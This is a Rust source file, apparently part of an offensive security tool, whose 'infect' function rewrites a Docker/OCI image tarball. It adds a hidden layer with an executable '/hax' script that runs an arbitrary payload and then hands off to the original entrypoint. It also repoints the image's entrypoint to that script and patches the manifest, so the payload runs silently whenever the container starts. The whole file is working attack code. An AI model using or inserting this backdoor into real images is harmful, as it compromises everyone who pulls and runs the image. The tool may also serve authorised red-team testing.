use crate::args;
use crate::errors::*;
use oci_spec::image::Config as ImageConfig;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::borrow::Cow;
use std::collections::HashMap;
use std::io;
use std::io::prelude::*;
use std::str;
use tar::{Archive, Builder};

#[derive(Debug, PartialEq, Eq, Clone, Serialize, Deserialize)]
pub struct LayerConfig {
    config: Option<ImageConfig>,
    rootfs: Option<RootFs>,
    #[serde(flatten)]
    extra: HashMap<String, serde_json::Value>,
}

impl LayerConfig {
    pub fn set_id(&mut self, value: String) {
        self.extra
            .insert("id".to_string(), serde_json::Value::String(value));
    }

    pub fn set_parent(&mut self, value: String) {
        self.extra
            .insert("parent".to_string(), serde_json::Value::String(value));
    }

    pub fn set_entrypoint(&mut self, value: Vec<String>) {
        if let Some(config) = &mut self.config {
            config.set_entrypoint(Some(value));
        }
    }

    pub fn add_rootfs_diff(&mut self, value: String) {
        if let Some(rootfs) = &mut self.rootfs {
            rootfs.diff_ids.push(value);
        }
    }

    pub fn user(&self) -> Option<&String> {
        let config = self.config.as_ref()?;
        config.user().as_ref()
    }

    pub fn entrypoint(&self) -> Option<&[String]> {
        let config = self.config.as_ref()?;
        let entrypoint = config.entrypoint().as_deref()?;
        Some(entrypoint)
    }
}

#[derive(Debug, PartialEq, Eq, Clone, Serialize, Deserialize)]
pub struct RootFs {
    pub r#type: String,
    pub diff_ids: Vec<String>,
}

#[derive(Debug, PartialEq, Eq, Clone, Serialize, Deserialize)]
pub struct Manifest {
    #[serde(rename = "Config")]
    pub config: String,
    #[serde(rename = "Layers")]
    pub layers: Vec<String>,
    #[serde(rename = "RepoTags")]
    pub repo_tags: Vec<String>,
}

pub fn generate_entrypoint_hook(payload: &str, entrypoint: Option<&[String]>) -> String {
    let mut exec = Vec::new();
    if let Some(entrypoint) = entrypoint {
        for arg in entrypoint {
            exec.push(shell_escape::escape(Cow::Borrowed(arg)).to_string());
        }
    }
    exec.push("\"$@\"".to_string());
    let buf = format!("#!/bin/sh\n{}\nexec {}\n", payload, exec.join(" "));
    debug!("Generated entrypoint hook: {:?}", buf);
    buf
}

pub fn generate_layer_fs_data(
    args: &args::InfectOci,
    entrypoint: Option<&[String]>,
) -> Result<(String, Vec<u8>)> {
    info!(
        "Generating filesystem layer for payload: {:?}",
        args.payload
    );
    let mut layer_data = Vec::new();
    {
        let buf = generate_entrypoint_hook(&args.payload, entrypoint);
        let buf = buf.as_bytes();
        let mut builder = tar::Builder::new(&mut layer_data);
        let mut header = tar::Header::new_ustar();
        header.set_mode(0o755);
        header.set_path("hax")?; // TODO
        header.set_size(buf.len() as u64);
        header.set_cksum();
        builder.append(&header, &mut &buf[..])?;
        builder.finish()?;
    }

    let mut rootfs_hash = Sha256::new();
    rootfs_hash.update(&layer_data);
    let rootfs_hash = rootfs_hash.finalize();
    let rootfs_hash = format!("sha256:{}", hex::encode(rootfs_hash));

    Ok((rootfs_hash, layer_data))
}

pub fn write_tar_entry<W: Write>(
    builder: &mut Builder<W>,
    header: &mut tar::Header,
    id: &str,
    key: &str,
    buf: &[u8],
) -> Result<()> {
    header.set_path(format!("{}/{}", id, key))?;
    header.set_size(buf.len() as u64);
    header.set_cksum();
    builder.append(header, &mut &buf[..])?;
    Ok(())
}

pub fn write_patch_layer<W: Write>(
    builder: &mut Builder<W>,
    args: &args::InfectOci,
    mut config: LayerConfig,
    parent: &str,
) -> Result<String> {
    let id = "patched".to_string();

    if let Some(user) = &config.user() {
        if !user.is_empty() {
            info!("User is set: {:?}", user);
        }
    }

    if let Some(entrypoint) = &config.entrypoint() {
        info!("Entrypoint is set: {:?}", entrypoint);
    }

    info!("Creating new layer in image: {:?}", id);
    let mut header = tar::Header::new_ustar();
    header.set_mode(0o755);
    header.set_path(format!("{}/", id))?;
    header.set_cksum();
    builder.append(&header, &mut io::empty())?;

    let (rootfs_hash, layer_data) = generate_layer_fs_data(args, config.entrypoint())?;

    let buf = "1.0";
    debug!("Adding version to layer: {:?}", buf);
    header.set_mode(0o644);
    write_tar_entry(builder, &mut header, &id, "VERSION", buf.as_bytes())?;

    debug!("Generating metadata...");
    config.set_id(id.to_string());
    config.set_parent(parent.to_string());
    config.set_entrypoint(vec!["/hax".to_string()]);
    config.add_rootfs_diff(rootfs_hash);
    let buf = serde_json::to_string(&config)?;
    debug!("Adding metadata to layer: {:?}", buf);
    write_tar_entry(builder, &mut header, &id, "json", buf.as_bytes())?;

    debug!("Adding fs data to layer");
    write_tar_entry(builder, &mut header, &id, "layer.tar", &layer_data)?;

    Ok(id)
}

pub fn infect(args: &args::InfectOci, pkg: &[u8]) -> Result<Vec<u8>> {
    let mut archive = Archive::new(pkg);

    let mut out = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut out);

        let mut config_map = HashMap::new();

        for entry in archive.entries()? {
            let mut entry = entry?;
            let mut header = entry.header().clone();
            debug!("Found entry in tar: {:?}", header.path());

            match header.path()?.to_str() {
                Some("manifest.json") => {
                    let mut buf = String::new();
                    entry.read_to_string(&mut buf)?;
                    trace!("Read manifest from image: {:?}", buf);

                    let mut manifests = serde_json::from_str::<Vec<Manifest>>(&buf)
                        .context("Failed to parse image layer json")?;
                    debug!("Parsed image manifests: {:?}", manifests);

                    let mut manifest = manifests.pop().context("Image has no manifest items")?;
                    if !manifests.is_empty() {
                        bail!("Image has more than one manifest item");
                    }

                    let config = config_map
                        .remove(&manifest.config)
                        .context("Manifest is referencing a config we don't know about")?;

                    info!(
                        "Original image is referencing config {:?}: {:?}",
                        &manifest.config, config
                    );

                    let parent = manifest
                        .layers
                        .last()
                        .context("Image manifest has no layers")?
                        .strip_suffix("/layer.tar")
                        .context("Can't detect id of parent layer")?;

                    let id = write_patch_layer(&mut builder, args, config, parent)
                        .context("Failed to add patch layer")?;

                    info!("Writing modified manifest...");
                    manifest.config = format!("{}/json", id);
                    manifest.layers.push(format!("{}/layer.tar", id));
                    let buf = serde_json::to_string(&[&manifest])?;
                    debug!("Modified manifest: {:?}", buf);
                    let buf = buf.as_bytes();
                    header.set_size(buf.len() as u64);
                    header.set_cksum();
                    builder.append(&header, &mut &buf[..])?;
                }
                Some("repositories") => {
                    builder.append(&header, &mut entry)?;
                }
                None => bail!("Invalid filename encoding in image"),
                Some(name) => {
                    if name.ends_with("json") {
                        let mut buf = String::new();
                        entry.read_to_string(&mut buf)?;
                        trace!("Read json from layer: {:?}", buf);

                        let layer = serde_json::from_str::<LayerConfig>(&buf)
                            .context("Failed to parse image layer json")?;
                        debug!("Parsed layer metadata: {:?}", layer);

                        config_map.insert(name.to_string(), layer);

                        builder.append(&header, &mut buf.as_bytes())?;
                    } else {
                        builder.append(&header, &mut entry)?;
                    }
                }
            }
        }

        builder.finish()?;
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_entrypoint_hook_scratch() {
        let hook = generate_entrypoint_hook("echo hello world", None);
        assert_eq!(hook, "#!/bin/sh\necho hello world\nexec \"$@\"\n");
    }

    #[test]
    fn test_generate_entrypoint_hook_simple() {
        let hook = generate_entrypoint_hook("echo hello world", Some(&["/foo/bar".to_string()]));
        assert_eq!(hook, "#!/bin/sh\necho hello world\nexec /foo/bar \"$@\"\n");
    }

    #[test]
    fn test_generate_entrypoint_hook_tricky() {
        let hook = generate_entrypoint_hook(
            "echo hello world",
            Some(&["echo".to_string(), "hello $world\n".to_string()]),
        );
        assert_eq!(
            hook,
            "#!/bin/sh\necho hello world\nexec echo 'hello $world\n' \"$@\"\n"
        );
    }
}
